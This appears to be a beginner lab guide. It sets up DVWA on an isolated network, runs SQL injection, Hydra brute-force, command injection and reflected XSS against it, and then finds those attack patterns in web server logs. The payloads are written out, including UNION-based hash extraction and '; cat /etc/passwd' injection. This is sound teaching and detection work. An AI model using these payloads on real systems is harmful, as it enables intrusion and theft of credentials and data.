# Web Application Range Lab

**Difficulty:** 🟢 Beginner

**Time:** 45 minutes

**Focus:** Attack a vulnerable web application and detect the attack patterns in HTTP logs.

## Goal

Deploy DVWA (Damn Vulnerable Web Application), perform basic web attacks (SQL injection, brute force), and observe how these attacks appear in logs.

## Prerequisites

- [ ] Attacker VM (Kali) with Burp Suite and browser
- [ ] Target VM with Docker installed, or a LAMP stack for manual DVWA install
- [ ] Both VMs on the same isolated network
- [ ] (Optional) Web server logs forwarded to your SIEM

## Topology

```
┌──────────────┐                    ┌──────────────┐
│    Kali      │◄──────────────────►│   Ubuntu     │
│  Attacker    │   Isolated Net     │   + Docker   │
│ 10.10.10.10  │   10.10.10.0/24    │   + DVWA     │
│              │                    │ 10.10.10.20  │
│ Browser      │                    │ Port 80      │
│ Burp Suite   │                    │              │
└──────────────┘                    └──────────────┘
```

## Build steps

### Step 1: Deploy DVWA

On your target VM:

**Option A: Docker (easier)**

```bash
# Install Docker if needed
sudo apt update
sudo apt install docker.io -y
sudo systemctl start docker
sudo systemctl enable docker

# Run DVWA
sudo docker run -d -p 80:80 --name dvwa vulnerables/web-dvwa
```

**Option B: Manual install**

```bash
sudo apt install apache2 mariadb-server php php-mysqli php-gd libapache2-mod-php -y
cd /var/www/html
sudo git clone https://github.com/digininja/DVWA.git
sudo chown -R www-data:www-data DVWA
# Follow DVWA setup instructions for database configuration
```

### Step 2: Verify DVWA is running

From Kali, open a browser and navigate to:

```
http://10.10.10.20/
```

You should see the DVWA login page.

Default credentials: `admin` / `password`

After logging in, go to "DVWA Security" and set security level to "Low" for this lab.

### Step 3: Enable logging (if using manual install)

Ensure Apache access logs are being written:

```bash
# Check log location
tail -f /var/log/apache2/access.log
```

For Docker, logs go to stdout. View with:

```bash
sudo docker logs -f dvwa
```

### Step 4: Snapshot

Snapshot both VMs: `lab-webapp-ready`

## Run the scenario

### Attack step 1: SQL injection

Navigate to: DVWA > SQL Injection

In the "User ID" field, enter:

```
1' OR '1'='1
```

Click Submit.

**What you should see:** Instead of one user's details, you see all users in the database. The injected SQL logic changed the query to return all rows.

Try another injection to extract data:

```
1' UNION SELECT user, password FROM users#
```

**What you should see:** Usernames and password hashes from the database.

### Attack step 2: Brute force login

Navigate to: DVWA > Brute Force

This simulates a login form. Let's attack it with Hydra.

First, examine the login form. Note the URL and parameter names.

From Kali terminal:

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.20 http-get-form "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect:H=Cookie: security=low; PHPSESSID=YOUR_SESSION_ID"
```

Replace `YOUR_SESSION_ID` with your actual session cookie from the browser.

**Note:** This is complex. Alternatively, use Burp Suite Intruder for a more visual approach.

**What you should see:** Hydra trying passwords until it finds the correct one.

### Attack step 3: Command injection

Navigate to: DVWA > Command Injection

This page pings an IP address. It's vulnerable to command injection.

Enter:

```
127.0.0.1; cat /etc/passwd
```

**What you should see:** The ping output followed by the contents of `/etc/passwd`. The semicolon let us append another command.

Try:

```
127.0.0.1; whoami
```

### Attack step 4: XSS (Cross-Site Scripting)

Navigate to: DVWA > XSS (Reflected)

Enter:

```
<script>alert('XSS')</script>
```

**What you should see:** A JavaScript alert box. In a real attack, this could steal cookies or redirect users.

### Success criteria

You've successfully:
- Exploited SQL injection to extract database contents
- Attempted brute force authentication
- Executed commands via command injection
- Demonstrated XSS

## Detection goals

### From web server logs

On the target, watch the access logs while attacking:

```bash
# Docker
sudo docker logs -f dvwa

# Manual install
tail -f /var/log/apache2/access.log
```

| What to find | What it looks like | What it indicates |
|--------------|-------------------|-------------------|
| SQL injection attempts | `1' OR '1'='1` in URL | SQLi attack |
| UNION-based extraction | `UNION SELECT` in URL | Data exfiltration attempt |
| Many login attempts | Repeated POST to `/brute/` | Brute force |
| Command injection | `; cat`, `; whoami` in params | OS command injection |
| XSS payloads | `<script>` in parameters | XSS attempt |

### What good detection looks like

You should be able to:
1. See the malicious payloads in the logs
2. Identify the attacking IP
3. See the pattern of attack (multiple attempts, different payloads)

### SIEM queries (if configured)

For Wazuh or ELK, search for:
- HTTP requests containing `' OR`
- HTTP requests containing `UNION SELECT`
- HTTP requests containing `<script>`
- High volume of requests to login endpoints

## Reset steps

1. If using Docker:
   ```bash
   sudo docker stop dvwa
   sudo docker rm dvwa
   sudo docker run -d -p 80:80 --name dvwa vulnerables/web-dvwa
   ```

2. If manual install, revert to snapshot

3. Clear browser history and Burp project if desired

## Debrief questions

1. **Why did the SQL injection work?** What should the application have done differently?

2. **What made command injection possible?** How should user input be handled?

3. **How visible were these attacks in logs?** What would make them harder to detect?

4. **What's the difference between reflected and stored XSS?** (Research this)

5. **How would a WAF (Web Application Firewall) help?** What patterns would it block?

## Portfolio notes

For your portfolio, capture:

- [ ] Screenshot of successful SQL injection showing extracted data
- [ ] Screenshot of command injection output
- [ ] Screenshot of XSS alert box
- [ ] Screenshot of attack patterns in access logs
- [ ] Write-up explaining what each vulnerability is and how to prevent it

## Further reading

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [DVWA Official GitHub](https://github.com/digininja/DVWA)

## Next labs

- [Windows Basics](../windows-basics/README.md) - Windows-specific techniques
- Try DVWA with security level "Medium" or "High" for more challenge